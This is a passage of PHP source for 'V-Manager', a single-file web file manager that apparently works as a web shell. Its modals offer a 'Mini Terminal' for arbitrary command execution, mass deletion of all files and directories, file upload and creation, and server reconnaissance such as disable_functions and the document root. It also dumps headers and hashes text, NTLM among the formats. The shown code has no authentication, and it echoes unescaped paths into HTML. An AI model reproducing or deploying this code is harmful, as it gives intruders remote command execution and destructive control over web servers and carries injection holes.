foreach($list as $delfiles){
            $fPath = $path."/".$delfiles;
            if(is_dir($fPath)) continue;           
	        echo '<option value="'.$fPath.'">'.$delfiles.'</option>';
	    }
 	    echo '</select>
 	 <br>
 	    <button type="submit" class="btn btn-warning rounded-0">Delete</button>
 	       </form>
 	    </center>
   	   </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
         </div>
    </div>
  </div>
</div>
';
echo '<button type="button" class="btn btn-primary rounded-0" data-toggle="modal" data-target="#deleteMassDir">
   Delete Dirs
</button>
<div class="modal fade" id="deleteMassDir" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Delete Selected Dirs</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
 	     <div class="form-group">
 	    <center>
 	  <p><b>Select Dirs : </b></p>
 	      <form method="POST" action="">
 	   <select name="deleteD[]" multiple class="form-control">';
 	   $dlist = scandir($path);
foreach($dlist as $deldir){
            $dPath = $path."/".$deldir;
            if($deldir == ".") continue;
            else if($deldir == "..") continue; 
            else if(!is_dir($dPath)) continue;        
	        echo '<option value="'.$dPath.'">'.$deldir.'</option>';
	    }
 	    echo '</select>
 	 <br>
 	     <button type="submit" class="btn btn-warning rounded-0">Delete</button>
 	      </form>
 	 </center>
   	   </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
        </div>
    </div>
  </div>
</div>
';

echo '<button type="button" class="btn btn-primary rounded-0" data-toggle="modal" data-target="#massDelete">
   Mass Delete
</button>
<div class="modal fade" id="massDelete" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Mass Delete</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
 	     <div class="form-group">
 	    <center>
 	  <p><b>Options : </b></p>
 	<form method="POST" action="">   
 	   <select name="massDel" class="form-control">
 	     <option value="">Select Options</option>
 	     <option value="delpic">Delete All Images</option>
 	     <option value="delmusic">Delete All MP3 Files</option>
 	     <option value="delvideo">Delete All MP4 Files</option>
 	     <option value="delzip">Delete All ZIP Files</option>
 	     <option value="deltxthtml">Delete All HTML Files</option>
 	     <option value="deltxtplain">Delete All TXT Files</option>
 	     <option value="delalledir">Delete All Empty Directory</option>
 	     <option value="delallfile">Delete All Files</option>
 	     <option value="dellalldir">Delete All Directory</option>
 	  </select>
 	<br><button type="submit" class="btn btn-warning rounded-0">Delete</button>
      </form>	 
 	 </center>
   	   </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>
';
echo '<button type="button" class="btn btn-primary rounded-0" data-toggle="modal" data-target="#makeFile">
   Make File
</button>
<div class="modal fade" id="makeFile" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
    <form method="POST" action="">    
        <center><b>File Name : </b><input type="text" name="makeName" pattern=".{1,}" class="border-dark rounded-pill" required title="1 characters minimum" placeholder="    File Name"></center>        
      </div>
      <div class="modal-body">
 	     <div class="form-group">
 	    <center>
 	  <textarea name="fcontent" class="form-control" rows="35" placeholder="  File Content"></textarea>
 	 </center>
   	   </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
        <button type="submit" class="btn btn-primary rounded-0">Save</button>
     </form>
      </div>
    </div>
  </div>
</div>
';
echo '<button type="button" class="btn btn-primary rounded-0" data-toggle="modal" data-target="#makeDir">
   Make Dir
</button>
<div class="modal fade" id="makeDir" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
         <h5 class="modal-title" id="exampleModalLabel">Make Directory</h5>
         <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
 	     <div class="form-group">
 	    <center>
 	     <br>
 	     <form method="POST" action="">
 <input class="form-control form-control-lg" type="text" placeholder=" Directory Name , Example : ThisIsDirectory" pattern=".{1,}" required title="1 characters minimum" name="makeDir">
   <br>
     <button type="submit" class="btn btn-warning rounded-0">Create</button>
       </form>
 </center>
   	   </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>
';

echo '<button type="button" class="btn btn-primary rounded-0 uplud" data-toggle="modal" data-target="#upludFile">
   Upload
</button>
<div class="modal fade" id="upludFile" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
         <h5 class="modal-title" id="exampleModalLabel">Upload File</h5>
         <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
 	     <div class="form-group">
 	    <center>
 	    <br> 
 	     <br>
      <div class="custom-file">
         <form method="POST" action="" enctype="multipart/form-data">
      <input type="hidden" name="uPath" value="'.$path.'">
      <input name="ups" type="file" class="custom-file-input" id="customFile">
      <label class="custom-file-label" for="customFile">Choose file</label>
      </div>
      </label>
      <br>
         <br>
           <br>
      <button type="submit" class="btn btn-warning rounded-0">Upload</button>
        </form>
  </center>
   	   </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>';

echo '<button type="button" class="btn btn-primary rounded-0" data-toggle="modal" data-target="#command">
   Command
</button>
<div class="modal fade" id="command" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
         <h5 class="modal-title" id="exampleModalLabel">Mini Terminal</h5>
         <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
 	     <div class="form-group">
 	    <center>
 	     <br>
 	      <form method="POST" action="">
 <input name="cmd" class="form-control form-control-lg" type="text" placeholder="    Command" pattern=".{1,}" required title="1 characters minimum">
     <br>
 <button type="submit" class="btn btn-warning rounded-0">Execute</button>
 </center>
   </form>
   	   </div>
      </div>
      <div class="modal-footer">
         <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
                </div>
    </div>
  </div>
</div>';
echo '<button type="button" class="btn btn-primary rounded-0" data-toggle="modal" data-target="#headinfo">
   Header Info
</button>
<div class="modal fade" id="headinfo" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable" role="document">
    <div class="modal-content">
      <div class="modal-header">
         <h5 class="modal-title" id="exampleModalLabel">Header Info</h5>
         <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
 	     <div class="form-group">
 	     <br>
  ';foreach (getallheaders() as $headName => $headValue) { 
  
  echo "<b>".htmlspecialchars($headName).":</b> ".htmlspecialchars($headValue)." <br>"; 
  } echo '<br>
   	   </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>
';

$servername = $_SERVER['SERVER_NAME'];
if(empty($servername)) $servername = "--";
$serveraddress = $_SERVER['SERVER_ADDR'];
if(empty($serveraddress)) $serveraddress = "--";
$serversoftware = $_SERVER['SERVER_SOFTWARE'];
if(empty($serversoftware)) $serversoftware = "--";
$serverport = $_SERVER['SERVER_PORT'];
if(empty($serverport)) $serverport = "--";
$documentroot = $_SERVER['DOCUMENT_ROOT'];
if(empty($documentroot)) $documentroot = "--";
$serverprotocol = $_SERVER['SERVER_PROTOCOL'];
if(empty($serverprotocol)) $serverprotocol = "--";
$gatewayinterface = $_SERVER['GATEWAY_INTERFACE'];
if(empty($gatewayinterface)) $gatewayinterface = "--";
$remoteaddress = $_SERVER['REMOTE_ADDR'];
if(empty($remoteaddress)) $remoteaddress = "--";
$remoteport = $_SERVER['REMOTE_PORT'];
if(empty($remoteport)) $remoteport = "--";
$disableF = ini_get('disable_functions');
if(empty($disableF)) $disableF = "NONE";

echo ''.str_repeat("&nbsp;",56).'<button type="button" class="btn btn-primary rounded-0" data-toggle="modal" data-target="#serverInfo">
   Server Info
</button>
<div class="modal fade" id="serverInfo" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
         <h5 class="modal-title" id="exampleModalLabel">Server Info</h5>
         <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
 	     <div class="form-group">
 	     '."
 	     <br><b>DOCUMENT ROOT".str_repeat('&nbsp;',10)."     :".str_repeat('&nbsp;',5)."</b>  $documentroot
 	     <br><b>SERVER OS".str_repeat('&nbsp;',24)."             :".str_repeat('&nbsp;',5)."</b>".PHP_OS."
 	     <br><b>SERVER NAME".str_repeat('&nbsp;',19)."       :".str_repeat('&nbsp;',5)."</b>  $servername 
 	     <br><b>SERVER ADDRESS".str_repeat('&nbsp;',12)."    :".str_repeat('&nbsp;',5)."</b>  $serveraddress
 	     <br><b>SERVER SOFTWARE".str_repeat('&nbsp;',9)."   :".str_repeat('&nbsp;',5)."</b>  $serversoftware
 	     <br><b>SERVER PORT".str_repeat('&nbsp;',20)."       :".str_repeat('&nbsp;',5)."</b>  $serverport
 	     <br><b>SERVER PROTOCOL".str_repeat('&nbsp;',9)."   :".str_repeat('&nbsp;',5)."</b>  $serverprotocol
 	     <br><b>REMOTE ADDRESS".str_repeat('&nbsp;',12)."    :".str_repeat('&nbsp;',5)."</b>  $remoteaddress
 	     <br><b>REMOTE PORT".str_repeat('&nbsp;',20)."       :".str_repeat('&nbsp;',5)."</b>  $remoteport
 	     <br><b>GATEWAY INTERFACE".str_repeat('&nbsp;',6)." :".str_repeat('&nbsp;',5)."</b>  $gatewayinterface
 	     ".lib_installed().'
 	     <br><b>DISABLE FUNCTIONS'.str_repeat("&nbsp;",8)." :".str_repeat("&nbsp;",6)."</b>".''.$disableF.'
   	   </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>';
echo '';
echo '<button type="button" class="btn btn-primary rounded-0" data-toggle="modal" data-target="#decoder">
   Decoder
</button>
<div class="modal fade" id="decoder" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Decoder</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
 	     <div class="form-group">
 	    <center>
 	<form method="POST" action="">
 	<textarea pattern=".{1,}" required title="1 characters minimum" class="form-control" rows="16" name="dreq" placeholder="Encoded String...." ></textarea>   
 	 <br>  
 	   <select name="decode" class="form-control" required>
 	     <option value="">Decode from...</option>
 	     <option value="base64">Base64</option>
 	     <option value="hex">Hex</option>
 	     <option value="url">URL</option>
 	     <option value="binary">Binary</option>
 	     <option value="charcode">Char Code</option>
 	     </select>
 	<br><button type="submit" class="btn btn-warning rounded-0">Decode</button>
      </form>	 
 	 </center>
   	   </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>
';

echo '<button type="button" class="btn btn-primary rounded-0" data-toggle="modal" data-target="#encoder">
   Encoder
</button>
<div class="modal fade" id="encoder" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Encoder</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
 	     <div class="form-group">
 	    <center>
 	<form method="POST" action="">   
 	   <textarea pattern=".{1,}" required title="1 characters minimum" class="form-control" rows="16" name="ereq" placeholder="Plain Text...." ></textarea>   
 	   <br>  
 	   <select name="encode" class="form-control" required>
 	   <option value="">Encode To...</option>
 	   <option value="base64">Base64</option>
 	   <option value="hex">Hex</option>
 	   <option value="url">URL</option>
 	   <option value="binary">Binary</option>
 	   <option value="charcode">Char Code</option>
 	   </select>
 	<br><button type="submit" class="btn btn-warning rounded-0">Encode</button>
      </form>	 
 	 </center>
   	   </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>
';

echo '<button type="button" class="btn btn-primary rounded-0 hash" data-toggle="modal" data-target="#hash">
   Hash
</button>
<div class="modal fade" id="hash" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Hash</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
 	     <div class="form-group">
 	    <center>
 	<form method="POST" action="">   
 	  <textarea name="plainhash" rows="11" placeholder="Plain Text...." class="form-control"></textarea> 
 	       <br>
 	   <select name="hashtype" class="form-control" required>
 	     <option value="">Hash Type...</option>
 	     <option value="md5">MD5</option>
 	     <option value="sha1">SHA1</option>
 	     <option value="sha256">SHA256</option>
 	     <option value="sha512">SHA512</option>
 	     <option value="ripemd160">RIPEMD160</option>
 	     <option value="ntlm">NTLM</option>
 	     <option value="md4">MD4</option>
 	     <option value="bcrypt">BCRYPT</option>
 	  </select>
 	<br><button type="submit" class="btn btn-warning rounded-0">Hash</button>
      </form>	 
 	 </center>
   	   </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>
';

echo '<button type="button" class="btn btn-primary rounded-0 aboutme" data-toggle="modal" data-target="#aboutMe">
   About
</button>
<div class="modal fade" id="aboutMe" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
         <h5 class="modal-title" id="exampleModalLabel">About</h5>
         <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <section id="about" class="bg-light">
      <div class="modal-body">
 	    <center>
 	     <br>
 	       <b>About : </b><br>
 	       V-Manager is a free file manager that have many feature to help you manage your web server easily. 
 	       <br><br>
 	       <b>How To Use : </b><br>
 	       <b>#</b> To edit, compress, extract and do other options, select the options in the select field and then click the [>] button.
 	      <br><b>#</b> To perform other actions, click the button at the top of the page according to the action you want.
 	       <br><b>#</b> If you want to see the contents of a file, just click the name of the file you want to see, if the file is an image then the image will appear, if the file is mp3 or wav then an audio control will appear, if the file is mp4 then a video control will appear , and for other files that will appear is the source code or a blank page.
 	       <br><b>#</b> If you cannot upload a file bigger than 2MB , please make sure you already set "php.ini" correctly.
 	       <br><br>
 	      <b>Contact Me : </b>
 	      <br>If you have any problems or questions you can contact me at :
 	       <br><br>
 	     <a href="https://www.instagram.com/irfan_vrn/" class="btn btn-block btn-info btn-block"><i class="fa fa-instagram"></i>'.str_repeat("&nbsp;",5).'<b>irfan_vrn</b></a>  
 	     <a href="mailto:thevale145@gmail.com" class="btn btn-block btn-danger btn-block"><i class="fa fa-envelope-o"></i>'.str_repeat("&nbsp;",5).'<b>thevale145@gmail.com</b></a>    
 	     <a href="https://github.com/TheValeHack/" class="btn btn-block btn-secondary btn-block"><i class="fa fa-github"></i>'.str_repeat("&nbsp;",5).'<b>TheValeHack</b></a>    
 	    <br>   
 	       </center>
   	   </div>
      </section>
      <div class="modal-footer"> 
        <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>
';
echo "<br><br>";
echo $resp;
function fperms($fl){
$perms = fileperms($fl);
if (($perms & 0xC000) == 0xC000) {
$iPerms = 's';
} elseif (($perms & 0xA000) == 0xA000) {
$iPerms = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
$iPerms = '-';
} elseif (($perms & 0x6000) == 0x6000) {
$iPerms = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
$iPerms = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
$iPerms = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
$iPerms = 'p';
} else {
$iPerms = 'u';
}

$iPerms .= (($perms & 0x0100) ? 'r' : '-');
$iPerms .= (($perms & 0x0080) ? 'w' : '-');
$iPerms .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

$iPerms .= (($perms & 0x0020) ? 'r' : '-');
$iPerms .= (($perms & 0x0010) ? 'w' : '-');
$iPerms .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

$iPerms .= (($perms & 0x0004) ? 'r' : '-');
$iPerms .= (($perms & 0x0002) ? 'w' : '-');
$iPerms .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $iPerms;
}
echo '<table class="table table-striped">
<thead class="thead-dark">
  <tr>
    <th scope="col"><center>Name</center></th>
    <th scope="col"><center>Size</center></th>
    <th scope="col"><center>Type</center></th>
    <th scope="col"><center>Last Modified</center></th>
    <th scope="col"><center>Permission</center></th>
    <th scope="col"><center>Options</center></th>
    <th scope="col"><center>Go</center></th>
  </tr>
</thead>
';
if(!is_readable($path)){
$readable = "<center><font class='denied'>PERMISSION DENIED</font><br><br></center>";
}
else {
   $readable = "";
}
echo $readable;

$dirList = scandir($path);
foreach($dirList as $dir){
if(!is_dir($path."/".$dir) | ($dir == ".") | ($dir == "..")) continue;
$dirPath = "?path=".$path."/".$dir;
if(strlen($dir) > 20){
     $dirN = substr($dir,0,17)."...";
}
else {
   $dirN = $dir;
}
$dirs = '<a href="'.$dirPath.'">'.htmlspecialchars($dirN)."</a>";
$dsize = filesize($path."/".$dir)/1024;
$dsize = round($dsize,2);
if($dsize >= 1024){
   $dsize = round($dsize/1024,2).' MB';
}
else{
$dsize = $dsize.' KB';
}
if(is_writable($path."/".$dir)){
     $dperms = '<font class="gperm" color="#00ff1a">'.fperms($path."/".$dir)."</font>";
}
else if (!is_readable($path."/".$dir)){
     $dperms = '<font color="red">'.fperms($path."/".$dir)."</font>";
}

echo '<tr><td class="namet"><center>'.$dirs."</center></td><td class='sizet'><center>".$dsize."</center></td><td class='typet'><center><font class='mtype'>".mime_content_type($path."/".$dir)."</font></center></td><td class='ldate'><center><font class='mdate'>".date("H:i A, j M Y",filemtime($path."/".$dir))."</font></center></td><td><center>".$dperms.'</center></td><td>
<form method="POST" action="">
<select name="set" class="opsi form-control" required>
<option value="">Select</option>
<option value="rename">Rename</option>
<option value="chmod">Chmod</option>
<option value="delete">Delete</option>
<option value="compress">Compress</option>
<option value="move">Move</option>
</select>
</td><td>
<input type="hidden" name="type" value="dirs">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="lpath" value="'.$path.'">
<button type="submit" class="btn btn-danger" name="submit"><b>></b></button>
</form></td></tr>';
}
$fileList = scandir($path);
foreach($fileList as $files){
$size = filesize($path."/".$files)/1024;
$size = round($size,2);
if($size >= 1024){
   $size = round($size/1024,2).' MB';
}
else{
$size = $size.' KB';
}
if(is_dir($path."/".$files)) continue;
$filePath = "?path=".$path."&file=".$files;
if(mime_content_type($path."/".$files) == "application/zip"){
      $extract = '<option value="unzip">Extract</option>';
      $filesN = $files;
}
else if(mime_content_type($path."/".$files) == "application/x-gzip"){
     $extract = '<option value="untar">Extract</option>';
     $filesN = $files;
}
else if(strlen($files) > 20){
      $filesN = substr($files,0,20);
      $filesN = $filesN."...";
}
else {
     $extract = "";
     $filesN = $files;
}
$fname = '<a href="'.$filePath.'">'.htmlspecialchars($filesN)."</a>";
if(is_writable($path."/".$files)){
     $fperms = '<font class="gperm" color="#00ff1a">'.fperms($path."/".$files)."</font>";
}
else if(!is_readable($path."/".$files)){
     $fperms = '<font color="red">'.fperms($path."/".$files)."</font>";
}
$ctype = mime_content_type($path."/".$files);
if($ctype == "application/vnd.openxmlformats-officedocument.wordprocessingml.document"){
     $ctype = "application/docx";
}
else if($ctype == "application/vnd.openxmlformats-officedocument.presentationml.presentation"){
    $ctype = "application/pptx";
}
else if($ctype == "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"){
    $ctype = "application/xlsx";
}
else if($ctype == "application/vnd.oasis.opendocument.presentation"){
     $ctype == "application/odp";
}
else if($ctype == "application/vnd.oasis.opendocument.text"){
   $ctype == "application/odt";
}
else if($ctype  == "application/vnd.apple.installer+xml"){
   $ctype == "application/mpkg";
}
   
echo '<tr><td class="namet"><center>'.$fname.'</center></td><td class="sizet"><center>'.$size.'</center></td><td class="typet"><center><font class="mtype">'.$ctype."</font></center></td><td class='ldate'><center><font class='mdate'>".date("H:i A,j M Y",filemtime($path."/".$files))."</font></center></td><td><center>".$fperms.'</center></td><td>
<form method="POST" action="">
<select name="set" class="opsi form-control" required>
<option value="">Select</option>
<option value="edit">Edit</option>
<option value="rename">Rename</option>
<option value="chmod">Chmod</option>
<option value="delete">Delete</option>'.$extract.'<option value="copy">Copy</option>
<option value="move">Move</option>
<option value="download">Download</option>
</select></td><td>
<input type="hidden" name="type" value="files">
<input type="hidden" name="name" value="'.$files.'">
<input type="hidden" name="fsize" value="'.$size.'">
<input type="hidden" name="lpath" value="'.$path.'">
<button type="submit" name="submit" class="btn btn-danger"><b>></b></button></form></td></tr>';
}
echo "</table>";

if(isset($file)){
    $finame = $path."/".$file;
      if(file_exists($finame) && !is_dir($finame)){
       if(mime_content_type($finame) == "image/jpeg"){
            $filecontent = "<center><img style='max-height: 400px;' src='".getUrl($finame)."'></center>";
       }
       else if(mime_content_type($finame) == "image/png"){
             $filecontent = "<center><img style='max-height:400px;' src='".getUrl($finame)."'></center>";
       }
       else if(mime_content_type($finame) == "audio/mpeg"){
             $filecontent = "<center><audio src='".getUrl($finame)."' controls></audio></center>";
       
       }
       else if(mime_content_type($finame) == "audio/x-wav"){
              $filecontent = "<center><audio src='".getUrl($finame)."' controls></audio></center>";
       }
       else if(mime_content_type($finame) == "video/mp4"){
              $filecontent = '<video style="max-height:400px" controls><source src="'.getUrl($finame).'" type="video/mp4"><source src="'.getOgg($finame).'" type="video/ogg">
              Your browser does not support the video tag.</video>';
       }
       else if(filesize($finame) > 134217727){
           $filecontent = "";
       }
       else {
       $filecontent = htmlspecialchars(file_get_contents($finame));
         } 
          echo '
<script>
	$(document).ready(function(){
		$("#showFile").modal("show");
	});
</script>
<div id="showFile" class="modal" tabindex="-1" role="dialog">
  <div class="modal-dialog modal-dialog-scrollable" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">'."File Name : ".htmlspecialchars($file).'</h5>
      </div>
      <div class="modal-body">
        <p>'.$filecontent.'</p>
      </div>
      <div class="modal-footer">
    <form method="POST" action="?path='.$_GET['path'].'">    
        <button type="submit" class="btn btn-secondary rounded-0">Close</button>
     </form> 
      </div>
    </div>
  </div>
</div>';
}
    echo "";
}
else {}
$option = $_POST['set'];

if(isset($option)){
    if($_POST['type'] == "dirs"){
             $dirname = $_POST['name'];
             $dirpath = $_POST['lpath'];
             $dirloc = $dirpath."/".$dirname;
        if($option == "rename"){
                 echo '
              <script>
              $(document).ready(function(){
              $("#renameDir").modal("show");
              });
                 </script>
           <div id="renameDir" class="modal" tabindex="-1" role="dialog">
            <div class="modal-dialog" role="document">
            <div class="modal-content">
            <div class="modal-header">
             <h5 class="modal-title">Rename : '.$dirname.'</h5>
             <button type="button" class="close" data-dismiss="modal" aria-label="Close">
             <span aria-hidden="true">&times;</span>
                 </button>
            </div>
                 <div class="modal-body">
             <form method="POST" action ="">  
                  <p><center><b>Rename to : 
                </b><br><br>
                    <input type="hidden" name="oldDir" value="'.$dirloc.'">
                    <input type="hidden" name="dirPath" value="'.$dirpath.'">
                  <input type="text" pattern=".{1,}" required title="1 characters minimum" name="renameDir" class="form-control" placeholder="New Name">
                    <br>
                    <button type="submit" class="btn btn-warning rounded-0">Rename</button>
               <br>
               </form>
                 </center>
           </div>
             <div class="modal-footer">
            <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
                 </div>
            </div>
                 </div>
                 </div>';
         }
         
       else if($option == "chmod"){
          echo '
              <script>
          $(document).ready(function(){
           $("#chmodDir").modal("show");
              });
              </script>
        <div id="chmodDir" class="modal" tabindex="-1" role="dialog">
              <div class="modal-dialog" role="document">
         <div class="modal-content">
              <div class="modal-header">
              <h5 class="modal-title">Chmod : '.$dirname.'</h5>
           <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">&times;</span>
              </button>
          </div>
              <div class="modal-body">
              <form method="POST" action ="">  
          <p><center><b>Chmod to : 
              </b><br><br>
          <input type="hidden" name="chmodDir" value="'.$dirloc.'">
              <input type="hidden" name="chmodPath" value="'.$dirpath.'">
         <input type="text" name="newChmod" class="form-control" value="'.substr(sprintf("%o", fileperms($dirloc)), -4).'">
              <br>
          <button type="submit" class="btn btn-warning rounded-0">Chmod</button>
              <br>
              </form>
              </center>
          </div>
              <div class="modal-footer">
              <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
          </div>
              </div>
              </div>
              </div>';
           }
        else if($option == "delete"){
           echo '<script>
           $(document).ready(function(){
       $("#deleteDir").modal("show");
           });
       </script>
           <div id="deleteDir" class="modal" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
         <div class="modal-content">
           <div class="modal-header">
       <h5 class="modal-title">Delete : '.$dirname.'</h5>
           <button type="button" class="close" data-dismiss="modal" aria-label="Close">
           <span aria-hidden="true">&times;</span>
       </button>
        </div>
           <div class="modal-body">
           <form method="POST" action="">
       <center><h2>Are you sure ?</h2></center>
         <input type="hidden" name="deldir" value="'.$dirloc.'">
        </div>
           <div class="modal-footer">
           <button type="submit" name="deletedir" class="btn btn-primary rounded-0">Yes</button></form>
           <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">No</button>
           </div>
        </div>
           </div>
           </div>';
        
        }
     else if($option == "compress"){
              echo '
                <script>
           $(document).ready(function(){
              $("#compressDir").modal("show");
           });
              </script>
              <div id="compressDir" class="modal" tabindex="-1" role="dialog">
          <div class="modal-dialog" role="document">
              <div class="modal-content">
            <div class="modal-header">
              <h5 class="modal-title">Compress : '.$dirname.'</h5>
           <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">&times;</span>
            </button>
              </div>
           <div class="modal-body">
              <form method="POST" action ="">  
          <p><center><b>Compress as : 
              </b><br><br>
              <input type="hidden" name="comDir" value="'.$dirloc.'">
          <input type="hidden" name="comPath" value="'.$dirpath.'">
              <input type="text" pattern=".{1,}" required title="1 characters minimum" name="comAs" class="form-control" placeholder="Example : [filename].zip">
          <br>
          <button type="submit" class="btn btn-warning rounded-0">Compress</button>
              <br>
          </form>
              </center>
           </div>
           <div class="modal-footer">
              <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
           </div>
              </div>
          </div>
              </div>';
     
     }
     else if($option == "move"){
         echo '
 			        <script>
 	        $(document).ready(function(){
         $("#moveTo").modal("show");
  		       });
         </script>
  	       <div id="moveTo" class="modal" tabindex="-1" role="dialog">
   		      <div class="modal-dialog" role="document">
  		       <div class="modal-content">
         <div class="modal-header">
   	      <h5 class="modal-title">Move : '.$dirname.'</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
    		     <span aria-hidden="true">&times;</span>
         </button>
         </div>
     		    <div class="modal-body">
         <form method="POST" action ="">  
         <p><center><b>Move To : 
   	      </b><br><br>
         <input type="hidden" name="moveDir" value="'.$dirloc.'">
    			     <input type="hidden" name="movePath" value="'.$dirpath.'">
         <input type="hidden" name="moveName" value="'.$dirname.'">
     		    <input type="text" name="moveTo" pattern=".{1,}" required title="1 characters minimum" class="form-control" placeholder="Example : /home/thevale/move/here ">
     	    <br>
         <button type="submit" class="btn btn-warning rounded-0">Move</button>
  	   		    </form> 	       		       
         </br>
	         </center>
 	        </div>
         <div class="modal-footer">
         <button type="button" class="btn btn-secondary rounded-0" data-dismiss="modal">Close</button>
  	     	  </div>
 		        </div>
         </div>
  	       </div>';
     
     }
         }
     else if($_POST['type'] == "files"){
           $filename = $_POST['name'];
           $filepath = $_POST['lpath'];
           $fileloc = $filepath."/".$filename;
           if($option == "rename"){
           echo '
			;	           <script>
 			          $(document).ready(function(){
 					          $("#renameFile").modal("show");
           });
           </script>
           <div id="renameFile" class="modal" tabindex="-1" role="dialog">
           <div class="modal-dialog" role="document">
